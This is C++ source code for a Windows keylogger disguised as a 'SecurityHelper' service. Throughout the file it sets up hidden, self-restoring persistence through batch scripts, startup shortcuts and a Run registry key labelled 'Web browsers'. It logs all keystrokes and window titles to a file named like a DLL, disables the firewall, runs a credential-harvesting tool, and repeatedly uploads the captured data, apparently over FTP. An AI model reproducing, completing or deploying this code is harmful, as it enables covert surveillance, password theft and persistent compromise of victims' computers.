#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <direct.h>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <thread>
#include <aclapi.h>

#include "KeyConverter.h"
#include "FileHandler.h"
#include "FTPHandler.h"
#include "FirewallBypasser.h"
#include "Utils.h"

#pragma comment(linker, "/SUBSYSTEM:console /ENTRY:mainCRTStartup")

using namespace std;

bool firstRun;

const string sechelperPath = "C:\\ProgramData\\SecurityHelper";

//TODO: Create new file
void persist(){
    if (!fileExists("C:\\ProgramData\\SecurityHelper\\systemchecker.bat")){        
        char batContent[2048];
                
        strcpy(batContent, "attrib +s +h \"%~f0\"\r\n");
        strcat(batContent, "SETLOCAL EnableExtensions\r\n");
        strcat(batContent, "set EXE=sechelper.exe\r\n");
        strcat(batContent, ":check\r\n");
        strcat(batContent, "timeout /t 4\r\n");
        strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\sechelper.lnk goto create\r\n");        
        strcat(batContent, "if not exist C:\\ProgramData\\SecurityHelper\\sechelper.exe goto createexe\r\n");        
        strcat(batContent, "if not exist C:\\Users\\Public\\Documents\\backup.rar goto createbackup\r\n");
        strcat(batContent, "FOR /F %%x IN ('tasklist /NH /FI \"IMAGENAME eq %EXE%\"') DO IF %%x == %EXE% goto check\r\n");
        strcat(batContent, "goto ProcessNotFound\r\n");
        
        strcat(batContent, ":create\r\n");        
        strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
        strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
        strcat(batContent, "echo sLinkFile = \"C:\\ProgramData\\SecurityHelper\\sechelper.lnk\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.TargetPath = \"C:\\ProgramData\\SecurityHelper\\sechelper.exe\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
        strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
        strcat(batContent, "del %SCRIPT%\r\n");
        strcat(batContent, "copy C:\\ProgramData\\SecurityHelper\\sechelper.lnk %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\sechelper.lnk /y\r\n");
        strcat(batContent, "del C:\\ProgramData\\SecurityHelper\\sechelper.lnk\r\n");        
        strcat(batContent, "goto check\r\n");
        
        strcat(batContent, ":createexe\r\n");        
        strcat(batContent, "attrib -s -h C:\\Users\\Public\\Documents\\backup.rar\r\n");          
        strcat(batContent, "copy C:\\Users\\Public\\Documents\\backup.rar C:\\ProgramData\\SecurityHelper\\sechelper.exe /y\r\n");  
        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.rar \r\n");               
        strcat(batContent, "attrib +s +h C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n"); 
        strcat(batContent, "goto check\r\n");
        
        strcat(batContent, ":createbackup\r\n");          
        strcat(batContent, "attrib -s -h C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n");        
        strcat(batContent, "copy C:\\ProgramData\\SecurityHelper\\sechelper.exe C:\\Users\\Public\\Documents\\backup.rar /y\r\n");     
        strcat(batContent, "attrib +s +h C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n");          
        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.rar \r\n");          
        strcat(batContent, "goto check\r\n");
                
        strcat(batContent, ":ProcessNotFound\r\n");          
        strcat(batContent, "start C:\\ProgramData\\SecurityHelper\\sechelper.exe \r\n");          
        strcat(batContent, "goto check\r\n");
        
        ofstream bat("C:\\ProgramData\\SecurityHelper\\systemchecker.bat");
        bat << batContent;
        bat.close();
    }
    
    runBatFile("C:\\ProgramData\\SecurityHelper\\systemchecker.bat");    
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH*2;
    wchar_t szValue[count] = {};

    wcscpy(szValue, L"\"");
    wcscat(szValue, pathToExe);
    wcscat(szValue, L"\" ");

    if (args != NULL) {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat(szValue, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess) {
        dwSize = (wcslen(szValue)+1)*2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL) {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void RegisterProgram() {
    wchar_t szPathToExe[MAX_PATH];   
    const wchar_t* path = s2wct("C:\\ProgramData\\SecurityHelper\\sechelper.exe");    
    wcscpy(szPathToExe, path);        
    RegisterMyProgramForStartup(L"Web browsers", szPathToExe, NULL);
}

void infect(){
    mkdir(sechelperPath.c_str());
    char pathLocation[MAX_PATH];
    strcpy(pathLocation, sechelperPath.c_str());
    strcat(pathLocation, "\\nananana.bat");
    
    char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
    strcpy(startup, "C:\\Users\\");
    strcat(startup, getUserName().c_str());
    strcat(startup, "\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");
    
    char sechelperLoc[MAX_PATH];
    strcpy(sechelperLoc, startup);
    strcat(sechelperLoc, "\\sechelper.lnk");
        
    char batContent[2048];
    bool sechelperExists = true;
    
    if (!fileExists(sechelperPath.c_str()) || !fileExists("C:\\ProgramData\\SecurityHelper\\sechelper.exe")){
        sechelperExists = false;
    }
    
    Sleep(2000);
    if(!fileExists(sechelperLoc) || !sechelperExists){
        strcpy(batContent, "set \"destino0=");
        strcat(batContent, getExecutableFullPath().c_str());
        strcat(batContent, "\"");
        strcat(batContent, "\r\n");
        strcat(batContent, "set \"destino1=%appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\\"\r\n"); //TODO: usar variable startup
        strcat(batContent, "set \"destino2=C:\\ProgramData\\SecurityHelper\\\"\r\n");
        strcat(batContent, "set \"destino3=C:\\ProgramData\\SecurityHelper\\sechelper.exe\"\r\n");
        if(!sechelperExists){
           strcat(batContent, "copy %destino0% %destino3% /y\r\n");
           strcat(batContent, "attrib C:\\ProgramData\\SecurityHelper +s +h\r\n");
        }
        strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
        strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
        strcat(batContent, "echo sLinkFile = \"%destino2%sechelper.lnk\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.TargetPath = \"%destino3%\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
        strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
        strcat(batContent, "del %SCRIPT%\r\n");
        strcat(batContent, "xcopy %destino2%sechelper.lnk %destino1% /y\r\n");
        strcat(batContent, "del %destino2%sechelper.lnk\r\n");
        strcat(batContent, "attrib %destino3% +s +h\r\n");
        strcat(batContent, "attrib %destino2%sysid.dat +s +h\r\n");
        strcat(batContent, "attrib %destino2%systemconf.dll +s +h\r\n");
        strcat(batContent,"DEL \"%~f0\"\r\n\0");

        ofstream bat(pathLocation);
        bat << batContent;
        bat.close();

        runBatFile(pathLocation);        
        RegisterProgram();
        Sleep(2000);
        if(firstRun){
            runSechelper();
            exit(0);
        }
    }
}

void Log(int limite_keystrokes){
    string strings="";
    int keys;
    int keystrokes=0;
    char currentWindowTitle[MAX_PATH];
    char newWindowTitle[MAX_PATH];

    GetWindowText(GetForegroundWindow(), currentWindowTitle, sizeof(currentWindowTitle));

    while(keystrokes<limite_keystrokes){
        Sleep(5);
        for(keys=8;keys<=256;keys++){
            if(GetAsyncKeyState(keys)&1==1){
                GetWindowText(GetForegroundWindow(),currentWindowTitle,sizeof(currentWindowTitle));
                strings = convertKey(keys, keystrokes);
                if(strcmp(currentWindowTitle,  newWindowTitle)&& strings!="" && strings!="[TAB]"){

                    ofstream store("C:\\ProgramData\\SecurityHelper\\systemconf.dll", ios::app);
                    store << "\r\n" << "__________________________________________";
                    store << "\n" << "WINDOW: " << currentWindowTitle << "\n"
                            << "CONTENT: ";
                    store.close();
                    strcpy(newWindowTitle, currentWindowTitle);
                }
               //cout << "Tecla pulsada: " << keys << endl;
                storeKey(strings);
                keystrokes++;
                //cout << "llevas " << keystrokes << " keystrokes de " << limite_keystrokes << endl;
            }
        }
    }
}

std::string getIdentification(){
    std::ifstream id("C:\\ProgramData\\SecurityHelper\\sysid.dat");
    std::string identification;
    bool sendFileOnFirstRun = false;
    
    if(id.good()){
        if(isProcessRunning("sechelper.exe")){
            exit(0);
        }
        else {
            if(!fileExists("C:\\ProgramData\\SecurityHelper\\sechelper.exe"))
                infect();
            firstRun = false;
            persist();
            getline(id, identification);
            id.close();
        }
        
    }
    else{        
        firstRun = true;
        identification = createId();
        if(sendFileOnFirstRun){
            sendFile(identification, firstRun); 
        }
        runLazagne();
        infect();
    }  
    return identification;
}

int main(int argc, char *argv[]){  
    DWORD dwThreadId = 0;    
    CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(DisableFirewall), NULL, 0, &dwThreadId);  
    
    string id = getIdentification();
    int keystroke_limit=500;
    //TODO: add support for firewall alerts in other languages
    //TODO: add more character combinations
    
    while(true){
        Log(keystroke_limit);
        sendFile(id, firstRun);
        keystroke_limit+=500;
    }
    return 0;
}                     
